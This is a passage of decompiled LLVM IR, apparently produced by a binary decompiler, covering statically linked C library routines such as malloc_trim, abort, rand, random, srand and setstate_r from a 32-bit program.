  store i32 ptrtoint (i8* @global_var_807f400.681 to i32), i32* @edx, align 4
  %v0_8060d55 = call i32 @__malloc_trim()
  store i32 %v0_8060d55, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060d7c

dec_label_pc_8060d5c:                             ; preds = %dec_label_pc_8060c64
  %v2_8060d5c = inttoptr i32 %v1_8060c2d to i32*
  %v3_8060d5c = load i32, i32* %v2_8060d5c, align 4
  store i32 %v3_8060d5c, i32* %edx.global-to-local, align 4
  %v0_8060d5f = load i32, i32* @global_var_807f750.689, align 16
  %v1_8060d5f = add i32 %v0_8060d5f, -1
  store i32 %v1_8060d5f, i32* @global_var_807f750.689, align 16
  %v2_8060d65 = add i32 %v3_8060d5c, %v1_8060c3d
  store i32 %v2_8060d65, i32* %eax.global-to-local, align 4
  %v2_8060d68 = sub i32 %v1_8060c2d, %v3_8060d5c
  %v0_8060d6e = load i32, i32* @global_var_807f764.693, align 4
  %v2_8060d6e = sub i32 %v0_8060d6e, %v2_8060d65
  store i32 %v2_8060d6e, i32* @global_var_807f764.693, align 4
  %v4_8060d74 = call i32 @munmap(i32 %v2_8060d68, i32 %v2_8060d65, i32 %v1_8060c3d, i32 %v1_8060c3d)
  store i32 %v4_8060d74, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060d7c

dec_label_pc_8060d7c:                             ; preds = %dec_label_pc_8060d38, %dec_label_pc_8060d17, %dec_label_pc_8060d4b, %dec_label_pc_8060c44, %dec_label_pc_8060d5c
  store i32 %v2_8060c17, i32* %eax.global-to-local, align 4
  %v3_8060d85 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  store i32 %v3_8060d85, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060d8d

dec_label_pc_8060d8d:                             ; preds = %entry, %dec_label_pc_8060d7c
  %.0 = phi i32 [ undef, %entry ], [ %v3_8060d85, %dec_label_pc_8060d7c ]
  store i32 %v0_8060bfc, i32* @ebx, align 4
  store i32 %v0_8060bfb, i32* @esi, align 4
  store i32 %v0_8060bfa, i32* @edi, align 4
  store i32 %v0_8060bf9, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8060d5c, { 1, 0, 2 }
  uselistorder i32 %v0_8060cee, { 1, 0 }
  uselistorder i32 %v1_8060cbc, { 1, 0 }
  uselistorder i32 %v2_8060cb5, { 1, 0 }
  uselistorder i32 %v1_8060caa, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8060cb9, { 1, 0 }
  uselistorder i32 %v2_8060c47, { 1, 0 }
  uselistorder i32 %v1_8060c3d, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8060c35, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8060c2d, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 21, 22, 23, 24, 25, 26, 19, 20 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* bitcast (i8* @global_var_807f400.681 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_807f434.684 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_8060d8d, { 1, 0 }
  uselistorder label %dec_label_pc_8060d7c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8060d38, { 1, 0 }
  uselistorder label %dec_label_pc_8060d17, { 1, 0 }
  uselistorder label %dec_label_pc_8060ce2, { 1, 0 }
  uselistorder label %dec_label_pc_8060cda, { 1, 0 }
  uselistorder label %dec_label_pc_8060ca6, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8060d95 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8060da2 = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_807f400.681 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_807f400.681 to i32), i32* @edx, align 4
  %v0_8060daf = load i32, i32* @ebx, align 4
  store i32 %v0_8060daf, i32* @eax, align 4
  store i32 %v0_8060d95, i32* @ebx, align 4
  %v0_8060db2 = call i32 @__malloc_trim()
  ret i32 %v0_8060db2

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_807f400.681 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i32 (i32*)* @__malloc_consolidate, { 0, 3, 1, 2, 4 }
  uselistorder i8* @global_var_807f400.681, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8060dc4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075548.701 to i32))
  %v12_8060dce = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060dd3

dec_label_pc_8060dd3:                             ; preds = %dec_label_pc_8060dd3.dec_label_pc_8060dd3_crit_edge, %entry
  %v0_8060dd3 = phi i32 [ %v12_8060dce, %entry ], [ %v0_8060dd3.pre, %dec_label_pc_8060dd3.dec_label_pc_8060dd3_crit_edge ]
  %v1_8060dde19 = phi i32 [ 31, %entry ], [ %v1_8060dde, %dec_label_pc_8060dd3.dec_label_pc_8060dd3_crit_edge ]
  %v2_8060dd3 = mul i32 %v1_8060dde19, 4
  %v3_8060dd3 = add i32 %v2_8060dd3, 152
  %v4_8060dd3 = add i32 %v3_8060dd3, %v0_8060dd3
  %v5_8060dd3 = inttoptr i32 %v4_8060dd3 to i32*
  store i32 0, i32* %v5_8060dd3, align 4
  %v0_8060dde.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8060dde = add i32 %v0_8060dde.pre, -1
  %v9_8060dde = icmp slt i32 %v1_8060dde, 0
  store i32 %v1_8060dde, i32* %eax.global-to-local, align 4
  %v1_8060ddf = icmp eq i1 %v9_8060dde, false
  br i1 %v1_8060ddf, label %dec_label_pc_8060dd3.dec_label_pc_8060dd3_crit_edge, label %dec_label_pc_8060de1

dec_label_pc_8060dd3.dec_label_pc_8060dd3_crit_edge: ; preds = %dec_label_pc_8060dd3
  %v0_8060dd3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8060dd3

dec_label_pc_8060de1:                             ; preds = %dec_label_pc_8060dd3
  %v0_8060de1 = load i32, i32* @ebx, align 4
  %v2_8060de5 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8060de5, i32* @ebx, align 4
  %v4_8060ded = call i32 @__sigaddset(i32 %v2_8060de5, i32 6, i32 %v0_8060de1, i32 %v0_8060de1)
  store i32 %v4_8060ded, i32* %eax.global-to-local, align 4
  %v1_8060df5 = icmp eq i32 %v4_8060ded, 0
  %v1_8060df7 = icmp eq i1 %v1_8060df5, false
  br i1 %v1_8060df7, label %dec_label_pc_8060e07, label %dec_label_pc_8060df9

dec_label_pc_8060df9:                             ; preds = %dec_label_pc_8060de1
  %v3_8060dff = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8060dff = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8060dff, i32 0)
  store i32 %v4_8060dff, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060e07

dec_label_pc_8060e07:                             ; preds = %dec_label_pc_8060de1, %dec_label_pc_8060df9
  %v2_8060e3f4 = phi i32 [ %v4_8060ded, %dec_label_pc_8060de1 ], [ %v4_8060dff, %dec_label_pc_8060df9 ]
  %v0_8060e07 = load i8, i8* @global_var_807df00.702, align 256
  %v1_8060e07 = icmp eq i8 %v0_8060e07, 0
  %v1_8060e0e = icmp eq i1 %v1_8060e07, false
  br i1 %v1_8060e0e, label %dec_label_pc_8060e3f, label %dec_label_pc_8060e10

dec_label_pc_8060e10:                             ; preds = %dec_label_pc_8060e07
  store i8 1, i8* @global_var_807df00.702, align 256
  br label %dec_label_pc_8060e17

dec_label_pc_8060e17:                             ; preds = %dec_label_pc_8060e7e, %dec_label_pc_8060e10
  %v1_8060e1f = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8075548.701 to i32))
  store i32 %v1_8060e1f, i32* %eax.global-to-local, align 4
  %v1_8060e2b = call i32 @__GI_raise(i32 6)
  store i32 %v1_8060e2b, i32* %eax.global-to-local, align 4
  %v1_8060e37 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075548.701 to i32))
  store i32 %v1_8060e37, i32* %eax.global-to-local, align 4
  %v0_8060e3f.pre = load i8, i8* @global_var_807df00.702, align 256
  br label %dec_label_pc_8060e3f

dec_label_pc_8060e3f:                             ; preds = %dec_label_pc_8060e07, %dec_label_pc_8060e17
  %v2_8060e3f = phi i32 [ %v2_8060e3f4, %dec_label_pc_8060e07 ], [ %v1_8060e37, %dec_label_pc_8060e17 ]
  %v0_8060e3f = phi i8 [ %v0_8060e07, %dec_label_pc_8060e07 ], [ %v0_8060e3f.pre, %dec_label_pc_8060e17 ]
  %v1_8060e3f = zext i8 %v0_8060e3f to i32
  %v3_8060e3f = and i32 %v2_8060e3f, -256
  %v4_8060e3f = or i32 %v1_8060e3f, %v3_8060e3f
  store i32 %v4_8060e3f, i32* %eax.global-to-local, align 4
  %v10_8060e44 = icmp eq i8 %v0_8060e3f, 1
  %v1_8060e46 = icmp eq i1 %v10_8060e44, false
  br i1 %v1_8060e46, label %dec_label_pc_8060ea0, label %dec_label_pc_8060e48

dec_label_pc_8060e48:                             ; preds = %dec_label_pc_8060e3f
  %v2_8060e50 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8060e50, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_807df00.702, align 256
  %v3_8060e5c = bitcast i32* %stack_var_-272 to i8*
  %v4_8060e5c = call i32 @__GI_memset(i8* %v3_8060e5c, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060e73

dec_label_pc_8060e73:                             ; preds = %dec_label_pc_8060e73.dec_label_pc_8060e73_crit_edge, %dec_label_pc_8060e48
  %v0_8060e73 = phi i32 [ %v12_8060dce, %dec_label_pc_8060e48 ], [ %v0_8060e73.pre, %dec_label_pc_8060e73.dec_label_pc_8060e73_crit_edge ]
  %v1_8060e7b18 = phi i32 [ 31, %dec_label_pc_8060e48 ], [ %v1_8060e7b, %dec_label_pc_8060e73.dec_label_pc_8060e73_crit_edge ]
  %v2_8060e73 = mul i32 %v1_8060e7b18, 4
  %v3_8060e73 = add i32 %v2_8060e73, 16
  %v4_8060e73 = add i32 %v3_8060e73, %v0_8060e73
  %v5_8060e73 = inttoptr i32 %v4_8060e73 to i32*
  store i32 -1, i32* %v5_8060e73, align 4
  %v0_8060e7b.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8060e7b = add i32 %v0_8060e7b.pre, -1
  %v9_8060e7b = icmp slt i32 %v1_8060e7b, 0
  store i32 %v1_8060e7b, i32* %eax.global-to-local, align 4
  %v1_8060e7c = icmp eq i1 %v9_8060e7b, false
  br i1 %v1_8060e7c, label %dec_label_pc_8060e73.dec_label_pc_8060e73_crit_edge, label %dec_label_pc_8060e7e

dec_label_pc_8060e73.dec_label_pc_8060e73_crit_edge: ; preds = %dec_label_pc_8060e73
  %v0_8060e73.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8060e73

dec_label_pc_8060e7e:                             ; preds = %dec_label_pc_8060e73
  store i32 %v2_8060e50, i32* %eax.global-to-local, align 4
  %v4_8060e93 = call i32 @__GI_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8060e93, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060e17

dec_label_pc_8060ea0:                             ; preds = %dec_label_pc_8060e3f
  %v10_8060ea0 = icmp eq i8 %v0_8060e3f, 2
  %v1_8060ea2 = icmp eq i1 %v10_8060ea0, false
  br i1 %v1_8060ea2, label %dec_label_pc_8060eac, label %dec_label_pc_8060ea4

dec_label_pc_8060ea4:                             ; preds = %dec_label_pc_8060ea0
  store i8 3, i8* @global_var_807df00.702, align 256
  br label %dec_label_pc_8060eac

dec_label_pc_8060eac:                             ; preds = %dec_label_pc_8060ea0, %dec_label_pc_8060ea4
  %v0_8060eac = phi i8 [ %v0_8060e3f, %dec_label_pc_8060ea0 ], [ 3, %dec_label_pc_8060ea4 ]
  %v9_8060eac = icmp eq i8 %v0_8060eac, 3
  %v1_8060eb3 = icmp eq i1 %v9_8060eac, false
  br i1 %v1_8060eb3, label %dec_label_pc_8060ec6, label %dec_label_pc_8060eb5

dec_label_pc_8060eb5:                             ; preds = %dec_label_pc_8060eac
  store i8 4, i8* @global_var_807df00.702, align 256
  %v1_8060ec1 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8060ec6:                             ; preds = %dec_label_pc_8060eac, %dec_label_pc_8060ec6
  br label %dec_label_pc_8060ec6

; uselistorder directives
  uselistorder i32 %v1_8060e7b, { 2, 1, 0 }
  uselistorder i8 %v0_8060e3f, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8060dde, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 13, 14, 9, 10, 12, 11, 1 }
  uselistorder i8 3, { 0, 3, 5, 1, 4, 2 }
  uselistorder i32 (i32)* @pthread_mutex_unlock, { 0, 12, 11, 10, 9, 13, 3, 2, 6, 1, 8, 7, 5, 4 }
  uselistorder i8* @global_var_807df00.702, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8060ec6, { 1, 0 }
  uselistorder label %dec_label_pc_8060eac, { 1, 0 }
  uselistorder label %dec_label_pc_8060e3f, { 1, 0 }
  uselistorder label %dec_label_pc_8060e07, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8060ecc = call i32 @random()
  ret i32 %v0_8060ecc

; uselistorder directives
  uselistorder i32 ()* @random, { 36, 4, 3, 2, 1, 0, 10, 9, 8, 7, 6, 5, 16, 15, 14, 13, 12, 11, 22, 21, 20, 19, 18, 17, 35, 34, 33, 32, 31, 30, 28, 27, 26, 29, 25, 24, 23 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8060ed4 = load i32, i32* @ebx, align 4
  store i32 %v0_8060ed4, i32* %stack_var_-4, align 4
  %v2_8060ee2 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8060ee2, i32* @ebx, align 4
  %v4_8060ee7 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134589241, i32 ptrtoint (i32* @global_var_8075560.703 to i32))
  %v1_8060ef3 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075560.703 to i32))
  store i32 ptrtoint (i32* @global_var_8075560.703 to i32), i32* @ecx, align 4
  %v2_8060efa = ptrtoint i32* %stack_var_-8 to i32
  %v3_8060f04 = call i32 @__GI_random_r(i32* nonnull @global_var_8075578, i32 %v2_8060efa)
  %v3_8060f0e = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v3_8060f13 = load i32, i32* %stack_var_-8, align 4
  %v2_8060f1a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8060f1a, i32* @ebx, align 4
  ret i32 %v3_8060f13
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v4_8060f32 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134589241, i32 ptrtoint (i32* @global_var_8075560.703 to i32))
  %v1_8060f3e = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075560.703 to i32))
  %v0_8060f43 = load i32, i32* bitcast (i32** @global_var_8075580.706 to i32*), align 128
  store i32 %v0_8060f43, i32* @ebx, align 4
  %v3_8060f54 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_8075578)
  %v2_8060f5c = icmp slt i32 %v3_8060f54, 0
  br i1 %v2_8060f5c, label %dec_label_pc_8060f63, label %dec_label_pc_8060f60

dec_label_pc_8060f60:                             ; preds = %entry
  br label %dec_label_pc_8060f63

dec_label_pc_8060f63:                             ; preds = %entry, %dec_label_pc_8060f60
  %v3_8060f6c = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_8060f74 = load i32, i32* @esi, align 4
  ret i32 %v0_8060f74

; uselistorder directives
  uselistorder label %dec_label_pc_8060f63, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_8060f88 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8060f88, i32* @ebx, align 4
  %v4_8060f8d = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-24, i32 134589241, i32 ptrtoint (i32* @global_var_8075560.703 to i32))
  %v1_8060f99 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075560.703 to i32))
  store i32 ptrtoint (i32** @global_var_807557c.707 to i32), i32* @esi, align 4
  %v4_8060fb8 = inttoptr i32 %arg2 to i32*
  %v5_8060fb8 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_8060fb8, i32 %arg3, i32 ptrtoint (i32* @global_var_8075578 to i32))
  %v3_8060fc3 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-24, i32 1)
  %v0_8060fcb = load i32, i32* @esi, align 4
  ret i32 %v0_8060fcb
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8060fd0 = load i32, i32* @ebx, align 4
  store i32 %v0_8060fd0, i32* %stack_var_-4, align 4
  %v2_8060fde = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8060fde, i32* @ebx, align 4
  %v4_8060fe3 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-20, i32 134589241, i32 ptrtoint (i32* @global_var_8075560.703 to i32))
  %v1_8060fef = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075560.703 to i32))
  %v3_8060fff = call i32 @srandom_r(i32 %arg1, i32* nonnull @global_var_8075578)
  store i32 %arg1, i32* @ecx, align 4
  %v3_8061009 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-20, i32 1)
  %v2_8061011 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8061011, i32* @ebx, align 4
  ret i32 %v3_8061009

; uselistorder directives
  uselistorder i32* @global_var_8075578, { 0, 3, 1, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_8075560.703 to i32), { 5, 1, 6, 2, 7, 3, 0, 8, 4 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_8061017 = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_8061023 = add i32 %tmp3, 12
  %v2_8061023 = inttoptr i32 %v1_8061023 to i32*
  %v3_8061023 = load i32, i32* %v2_8061023, align 4
  store i32 %v3_8061023, i32* @ecx, align 4
  %v1_8061026 = add i32 %arg1, 4
  store i32 %v1_8061026, i32* %esi.global-to-local, align 4
  %v1_8061029 = add i32 %tmp3, 8
  %v2_8061029 = inttoptr i32 %v1_8061029 to i32*
  %v3_8061029 = load i32, i32* %v2_8061029, align 4
  %v1_806102c = icmp eq i32 %v3_8061023, 0
  %v1_806102e = icmp eq i1 %v1_806102c, false
  br i1 %v1_806102e, label %dec_label_pc_8061039, label %dec_label_pc_8061030

dec_label_pc_8061030:                             ; preds = %entry
  %v1_8061030 = add i32 %v3_8061029, -4
  %v2_8061030 = inttoptr i32 %v1_8061030 to i32*
  store i32 0, i32* %v2_8061030, align 4
  br label %dec_label_pc_8061049

dec_label_pc_8061039:                             ; preds = %entry
  %v1_8061039 = add i32 %tmp3, 4
  %v2_8061039 = inttoptr i32 %v1_8061039 to i32*
  %v3_8061039 = load i32, i32* %v2_8061039, align 4
  %v2_806103c = sub i32 %v3_8061039, %v3_8061029
  %v2_806103e = sdiv i32 %v2_806103c, 4
  %v3_8061041 = mul i32 %v2_806103e, 5
  %v2_8061044 = add i32 %v3_8061041, %v3_8061023
  store i32 %v2_8061044, i32* %eax.global-to-local, align 4
  %v2_8061046 = add i32 %v3_8061029, -4
  %v3_8061046 = inttoptr i32 %v2_8061046 to i32*
  store i32 %v2_8061044, i32* %v3_8061046, align 4
  br label %dec_label_pc_8061049

dec_label_pc_8061049:                             ; preds = %dec_label_pc_8061030, %dec_label_pc_8061039
  %v0_8061049 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061049 = add i32 %v0_8061049, -4
  %v2_8061049 = inttoptr i32 %v1_8061049 to i32*
  %v3_8061049 = load i32, i32* %v2_8061049, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8061051 = ashr i32 %v3_8061049, 31
  %v2_8061052 = zext i32 %v3_8061049 to i64
  %v4_8061052 = zext i32 %v1_8061051 to i64
  %v5_8061052 = mul nuw i64 %v4_8061052, 4294967296
  %v6_8061052 = or i64 %v5_8061052, %v2_8061052
  %v8_8061052 = sdiv i64 %v6_8061052, 5
  %v9_8061052 = trunc i64 %v8_8061052 to i32
  store i32 %v9_8061052, i32* %eax.global-to-local, align 4
  %v10_8061052 = srem i64 %v6_8061052, 5
  %v11_8061052 = trunc i64 %v10_8061052 to i32
  %v6_8061057 = icmp ugt i32 %v11_8061052, 4
  br i1 %v6_8061057, label %dec_label_pc_8061097, label %dec_label_pc_8061059

dec_label_pc_8061059:                             ; preds = %dec_label_pc_8061049
  %v1_8061059 = mul i32 %v11_8061052, 4
  %v2_8061059 = add i32 %v1_8061059, ptrtoint (i32* @global_var_806e5d4.708 to i32)
  %v3_8061059 = inttoptr i32 %v2_8061059 to i32*
  %v4_8061059 = load i32, i32* %v3_8061059, align 4
  store i32 %v4_8061059, i32* @ecx, align 4
  %v1_8061060 = icmp eq i32 %v11_8061052, 0
  %v2_8061062 = add i32 %v1_8061059, ptrtoint (i32* @global_var_806e5c0.709 to i32)
  %v3_8061062 = inttoptr i32 %v2_8061062 to i32*
  %v4_8061062 = load i32, i32* %v3_8061062, align 4
  store i32 %v4_8061062, i32* %ebp.global-to-local, align 4
  %v1_8061069 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061069 = add i32 %v1_8061069, 12
  %v3_8061069 = inttoptr i32 %v2_8061069 to i32*
  store i32 %v11_8061052, i32* %v3_8061069, align 4
  %v0_806106c = load i32, i32* @ecx, align 4
  %v1_806106c = load i32, i32* %ebx.global-to-local, align 4
  %v2_806106c = add i32 %v1_806106c, 16
  %v3_806106c = inttoptr i32 %v2_806106c to i32*
  store i32 %v0_806106c, i32* %v3_806106c, align 4
  %v0_806106f = load i32, i32* %ebp.global-to-local, align 4
  %v1_806106f = load i32, i32* %ebx.global-to-local, align 4
  %v2_806106f = add i32 %v1_806106f, 20
  %v3_806106f = inttoptr i32 %v2_806106f to i32*
  store i32 %v0_806106f, i32* %v3_806106f, align 4
  br i1 %v1_8061060, label %dec_label_pc_806108a, label %dec_label_pc_8061074

dec_label_pc_8061074:                             ; preds = %dec_label_pc_8061059
  %v0_8061074 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061074 = add i32 %v0_8061074, -4
  %v2_8061074 = inttoptr i32 %v1_8061074 to i32*
  %v3_8061074 = load i32, i32* %v2_8061074, align 4
  %v1_8061077 = ashr i32 %v3_8061074, 31
  %v0_8061078 = load i32, i32* %edi.global-to-local, align 4
  %v2_8061078 = zext i32 %v3_8061074 to i64
  %v4_8061078 = zext i32 %v1_8061077 to i64
  %v5_8061078 = mul nuw i64 %v4_8061078, 4294967296
  %v6_8061078 = or i64 %v5_8061078, %v2_8061078
  %v7_8061078 = zext i32 %v0_8061078 to i64
  %v8_8061078 = sdiv i64 %v6_8061078, %v7_8061078
  %v9_8061078 = trunc i64 %v8_8061078 to i32
  %v2_806107a = mul i32 %v9_8061078, 4
  %v3_806107a = add i32 %v2_806107a, %v0_8061074
  %v1_806107d = load i32, i32* %ebp.global-to-local, align 4
  %v2_806107d = add i32 %v1_806107d, %v9_8061078
  store i32 %v2_806107d, i32* %eax.global-to-local, align 4
  %v1_806107f = load i32, i32* %ebx.global-to-local, align 4
  %v2_806107f = add i32 %v1_806107f, 4
  %v3_806107f = inttoptr i32 %v2_806107f to i32*
  store i32 %v3_806107a, i32* %v3_806107f, align 4
  %v0_8061082 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061082 = ashr i32 %v0_8061082, 31
  %v0_8061083 = load i32, i32* @ecx, align 4
  %v2_8061083 = zext i32 %v0_8061082 to i64
  %v4_8061083 = zext i32 %v1_8061082 to i64
  %v5_8061083 = mul nuw i64 %v4_8061083, 4294967296
  %v6_8061083 = or i64 %v5_8061083, %v2_8061083
  %v7_8061083 = zext i32 %v0_8061083 to i64
  %v8_8061083 = sdiv i64 %v6_8061083, %v7_8061083
  %v9_8061083 = trunc i64 %v8_8061083 to i32
  store i32 %v9_8061083, i32* %eax.global-to-local, align 4
  %v10_8061083 = srem i64 %v6_8061083, %v7_8061083
  %v11_8061083 = trunc i64 %v10_8061083 to i32
  %v0_8061085 = load i32, i32* %esi.global-to-local, align 4
  %v2_8061085 = mul i32 %v11_8061083, 4
  %v3_8061085 = add i32 %v2_8061085, %v0_8061085
  %v1_8061088 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061088 = inttoptr i32 %v1_8061088 to i32*
  store i32 %v3_8061085, i32* %v2_8061088, align 4
  br label %dec_label_pc_806108a

dec_label_pc_806108a:                             ; preds = %dec_label_pc_8061059, %dec_label_pc_8061074
  %v0_806108a = load i32, i32* %esi.global-to-local, align 4
  %v1_806108a = load i32, i32* @ecx, align 4
  %v2_806108a = mul i32 %v1_806108a, 4
  %v3_806108a = add i32 %v2_806108a, %v0_806108a
  %v1_806108d = load i32, i32* %ebx.global-to-local, align 4
  %v2_806108d = add i32 %v1_806108d, 24
  %v3_806108d = inttoptr i32 %v2_806108d to i32*
  store i32 %v3_806108a, i32* %v3_806108d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8061092 = load i32, i32* %esi.global-to-local, align 4
  %v1_8061092 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8061092 = add i32 %v1_8061092, 8
  %v3_8061092 = inttoptr i32 %v2_8061092 to i32*
  store i32 %v0_8061092, i32* %v3_8061092, align 4
  %v0_80610ac.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80610a5

dec_label_pc_8061097:                             ; preds = %dec_label_pc_8061049
  %v1_8061097 = call i32 @__errno_location(i32 %v0_8061017)
  %v1_806109c = inttoptr i32 %v1_8061097 to i32*
  store i32 22, i32* %v1_806109c, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80610a5

dec_label_pc_80610a5:                             ; preds = %dec_label_pc_806108a, %dec_label_pc_8061097
  %v0_80610ac = phi i32 [ %v0_80610ac.pre, %dec_label_pc_806108a ], [ -1, %dec_label_pc_8061097 ]
  store i32 %v0_8061017, i32* @ebx, align 4
  ret i32 %v0_80610ac

; uselistorder directives
  uselistorder i32 %v11_8061052, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80610a5, { 1, 0 }
  uselistorder label %dec_label_pc_806108a, { 1, 0 }
  uselistorder label %dec_label_pc_8061049, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_80610b0 = load i32, i32* @ebx, align 4
  store i32 %v0_80610b0, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_80610b9 = add i32 %tmp3, 12
  %v2_80610b9 = inttoptr i32 %v1_80610b9 to i32*
  %v3_80610b9 = load i32, i32* %v2_80610b9, align 4
  %v4_80610b9 = icmp eq i32 %v3_80610b9, 0
  %v1_80610bd = add i32 %tmp3, 8
  %v2_80610bd = inttoptr i32 %v1_80610bd to i32*
